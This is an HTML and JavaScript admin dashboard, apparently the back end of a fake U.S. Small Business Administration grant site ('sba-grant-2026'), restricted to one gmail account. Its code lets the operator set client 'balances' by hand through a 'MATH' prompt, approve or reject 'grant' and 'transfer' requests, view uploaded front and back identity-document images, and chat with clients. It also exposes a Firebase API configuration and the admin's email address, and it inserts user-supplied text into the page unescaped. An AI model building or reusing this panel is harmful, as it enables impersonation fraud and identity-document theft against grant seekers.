<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA MASTER | COMMAND V8.2</title>
    <style>
        :root { --admin-red: #ba0c2f; --admin-blue: #00274c; --bg: #0f172a; }
        body { background: var(--bg); color: #f8fafc; font-family: -apple-system, sans-serif; margin: 0; padding-bottom: 30px; }
        
        .admin-nav { background: #1e293b; padding: 15px; border-bottom: 3px solid var(--admin-red); position: sticky; top: 0; z-index: 1000; text-align: center; }
        
        .stats-wrapper { display: flex; overflow-x: auto; gap: 10px; padding: 15px; scrollbar-width: none; }
        .stat-card { min-width: 140px; background: #334155; padding: 15px; border-radius: 12px; text-align: center; flex-shrink: 0; border: 1px solid #475569; }
        .stat-card h3 { font-size: 11px; margin: 0; color: #94a3b8; text-transform: uppercase; }
        .stat-card p { margin: 5px 0 0; font-size: 18px; font-weight: bold; color: #38bdf8; }

        .container { padding: 10px; max-width: 800px; margin: 0 auto; }
        .section-title { font-size: 11px; color: #38bdf8; text-transform: uppercase; letter-spacing: 1px; margin: 25px 0 10px; font-weight: bold; }
        
        /* USER CARD FIX */
        .user-card { background: #1e293b; padding: 15px; border-radius: 12px; margin-bottom: 12px; border-left: 5px solid #38bdf8; position: relative; display: flex; flex-direction: column; justify-content: center; }
        .bal { color: #10b981; font-weight: bold; font-size: 20px; margin-top: 5px; }
        
        /* SHARP MATH BUTTON */
        .math-btn { background: #38bdf8; color: #0f172a; border: none; font-size: 12px; padding: 10px 15px; border-radius: 8px; position: absolute; right: 15px; top: 50%; transform: translateY(-50%); font-weight: 800; cursor: pointer; box-shadow: 0 4px 0 #0284c7; }
        .math-btn:active { transform: translateY(-45%); box-shadow: none; }

        .req-item { background: #ffffff; color: #0f172a; padding: 15px; border-radius: 12px; margin-bottom: 15px; border-top: 5px solid #f59e0b; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        
        .action-btn { background: #10b981; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; flex: 1; font-size: 11px; }
        .reset-btn { background: #f59e0b; color: white; border: none; padding: 12px; border-radius: 8px; font-weight: bold; cursor: pointer; flex: 1; font-size: 11px; }
        .view-btn { display: inline-block; background: #64748b; color: white; padding: 8px 15px; text-decoration: none; border-radius: 6px; font-size: 11px; margin: 5px 5px 10px 0; border:none; cursor:pointer;}
        
        .chat-card { background: #ffffff; color: #1e293b; border-radius: 12px; margin-bottom: 20px; overflow: hidden; border: 1px solid #e2e8f0; }
        .chat-history { height: 220px; overflow-y: auto; background: #f8fafc; padding: 12px; display: flex; flex-direction: column; gap: 8px; }
        .msg { max-width: 80%; padding: 8px 12px; border-radius: 12px; font-size: 13px; }
        .msg.admin { align-self: flex-end; background: var(--admin-blue); color: white; border-bottom-right-radius: 2px; }
        .msg.user { align-self: flex-start; background: #e2e8f0; border-bottom-left-radius: 2px; }
        
        .reply-box { padding: 10px; display: flex; gap: 8px; background: white; border-top: 1px solid #eee; }
        .reply-box input { flex: 1; padding: 10px; border: 1px solid #cbd5e1; border-radius: 6px; }
    </style>
</head>
<body>

    <div class="admin-nav">
        <h1 style="font-size: 16px; margin: 0; color: white;">COMMAND V8.2 | MASTER</h1>
        <div id="adminEmail" style="font-size: 10px; color: #38bdf8; margin-top: 3px;">AUTHENTICATING...</div>
    </div>

    <div class="stats-wrapper">
        <div class="stat-card"><h3>Total Users</h3><p id="stat-users">0</p></div>
        <div class="stat-card"><h3>Active Tasks</h3><p id="stat-reqs">0</p></div>
        <div class="stat-card"><h3>Total Payout</h3><p id="stat-cash">$0</p></div>
    </div>

    <div class="container">
        <div class="section-title">ðŸ‘¤ Active Clients</div>
        <div id="userList"></div>

        <div class="section-title">âš¡ Action Stream</div>
        <div id="requestFeed"></div>

        <div class="section-title">ðŸ’¬ Live Support</div>
        <div id="chatFeed"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, collection, onSnapshot, query, orderBy, doc, updateDoc, getDoc, addDoc, deleteDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        onAuthStateChanged(auth, (user) => {
            if (user && user.email === "liger4683@gmail.com") {
                document.getElementById('adminEmail').innerText = "SYSTEM ONLINE: " + user.email;
            } else { window.location.href = "index.html"; }
        });

        // USERS LISTENER
        onSnapshot(collection(db, "users"), (snap) => {
            const list = document.getElementById('userList');
            let totalCash = 0; list.innerHTML = "";
            snap.forEach(d => {
                const u = d.data();
                const bal = parseFloat(u.balance) || 0;
                totalCash += bal;
                list.innerHTML += `
                    <div class="user-card">
                        <b style="font-size:15px; color:#f8fafc;">${u.fullName || 'Anonymous'}</b>
                        <small style="color:#94a3b8; font-size:11px;">${u.email}</small>
                        <div class="bal">$${bal.toLocaleString(undefined, {minimumFractionDigits: 2})}</div>
                        <button class="math-btn" onclick="window.doMath('${d.id}')">MATH</button>
                    </div>`;
            });
            document.getElementById('stat-users').innerText = snap.size;
            document.getElementById('stat-cash').innerText = "$" + totalCash.toLocaleString();
        });

        // TASK STREAM
        onSnapshot(collection(db, "requests"), (snap) => {
            const feed = document.getElementById('requestFeed');
            let taskCount = 0; feed.innerHTML = "";
            snap.forEach(d => {
                const r = d.data();
                if(r.status !== "PENDING") return;
                taskCount++;
                const isKyc = r.type && r.type.includes("KYC");
                feed.innerHTML += `
                    <div class="req-item">
                        <span style="font-size:10px; color:#64748b; font-weight:bold;">TASK #${d.id.substring(0,5)}</span>
                        <b style="display:block; margin:5px 0; font-size:16px;">${r.type}</b>
                        <p style="margin:0; font-size:12px;">Client: ${r.userName}</p>
                        <h2 style="color:var(--admin-red); margin:10px 0;">$${parseFloat(r.amount || 0).toLocaleString()}</h2>
                        ${isKyc ? `<button onclick="window.open('${r.frontImg}')" class="view-btn">FRONT</button><button onclick="window.open('${r.backImg}')" class="view-btn">BACK</button>` : ''}
                        <div style="display:flex; gap:10px; margin-top:10px;">
                            <button onclick="window.processTask('${d.id}', '${r.userId}', 'APPROVE', '${r.type}', ${r.amount || 0})" class="action-btn">APPROVE</button>
                            <button onclick="window.processTask('${d.id}', '${r.userId}', 'REJECT', '${r.type}', ${r.amount || 0})" class="action-btn" style="background:#64748b">REJECT</button>
                            ${isKyc ? `<button onclick="window.resendKYC('${d.id}', '${r.userId}')" class="reset-btn">RESEND</button>` : ''}
                        </div>
                    </div>`;
            });
            document.getElementById('stat-reqs').innerText = taskCount;
        });

        // CHAT LISTENER
        onSnapshot(query(collection(db, "support_tickets"), orderBy("timestamp", "asc")), (snap) => {
            const chatFeed = document.getElementById('chatFeed');
            const userGroups = {};
            snap.forEach(sDoc => {
                const m = sDoc.data();
                if (!m.userId) return;
                if (!userGroups[m.userId]) userGroups[m.userId] = { name: m.userName || "User", msgs: [] };
                userGroups[m.userId].msgs.push(m);
            });
            chatFeed.innerHTML = "";
            Object.keys(userGroups).forEach(uid => {
                const g = userGroups[uid];
                chatFeed.innerHTML += `
                    <div class="chat-card">
                        <div style="padding:10px; background:#f1f5f9; font-weight:bold; font-size:11px; color:#00274c;">${g.name.toUpperCase()}</div>
                        <div class="chat-history" id="chat-box-${uid}">${g.msgs.map(m => `<div class="msg ${m.sender === 'ADMIN' ? 'admin' : 'user'}">${m.message}</div>`).join('')}</div>
                        <div class="reply-box">
                            <input type="text" id="reply-input-${uid}" placeholder="Reply...">
                            <button onclick="window.adminReply('${uid}', '${g.name}')" class="action-btn" style="flex:0; padding:10px 20px;">SEND</button>
                        </div>
                    </div>`;
                const box = document.getElementById(`chat-box-${uid}`);
                if(box) box.scrollTop = box.scrollHeight;
            });
        });

        // FIXED MATH LOGIC
        window.doMath = async (uid) => {
            const userRef = doc(db, "users", uid);
            const userSnap = await getDoc(userRef);
            const currentBal = parseFloat(userSnap.data().balance) || 0;
            
            const val = prompt(`User: ${userSnap.data().fullName}\nCurrent Balance: $${currentBal.toLocaleString()}\n\nEnter amount to add (e.g. 500) or subtract (e.g. -500):`, "0");
            
            if(val === null || val === "" || isNaN(val)) return;
            
            try {
                const newBal = currentBal + parseFloat(val);
                await updateDoc(userRef, { balance: newBal });
                alert("Balance Updated Successfully!");
            } catch (e) { alert("Error: " + e.message); }
        };

        window.processTask = async (docId, uid, action, type, amt) => {
            const uRef = doc(db, "users", uid);
            const rRef = doc(db, "requests", docId);
            try {
                if (action === 'APPROVE') {
                    if (type.includes("KYC")) await updateDoc(uRef, { kycStatus: "APPROVED" });
                    else if (type.includes("GRANT")) {
                        const snap = await getDoc(uRef);
                        await updateDoc(uRef, { balance: (snap.data().balance || 0) + amt });
                    }
                    await updateDoc(rRef, { status: "SUCCESSFUL" });
                } else {
                    if (type.includes("KYC")) await updateDoc(uRef, { kycStatus: "REJECTED" });
                    else if (type.includes("TRANSFER")) {
                        const snap = await getDoc(uRef);
                        await updateDoc(uRef, { balance: (snap.data().balance || 0) + amt });
                    }
                    await updateDoc(rRef, { status: "DECLINED" });
                }
            } catch (e) { alert(e.message); }
        };

        window.resendKYC = async (docId, uid) => {
            if(!confirm("Reset this KYC and notify user?")) return;
            try {
                await deleteDoc(doc(db, "requests", docId));
                await updateDoc(doc(db, "users", uid), { kycStatus: "NOT_STARTED" });
                alert("User can now resubmit KYC.");
            } catch (e) { alert(e.message); }
        };

        window.adminReply = async (uid, name) => {
            const el = document.getElementById(`reply-input-${uid}`);
            if(!el.value) return;
            await addDoc(collection(db, "support_tickets"), {
                userId: uid, userName: name, message: el.value, sender: "ADMIN", timestamp: serverTimestamp()
            });
            el.value = "";
        };
    </script>
</body>
</html>
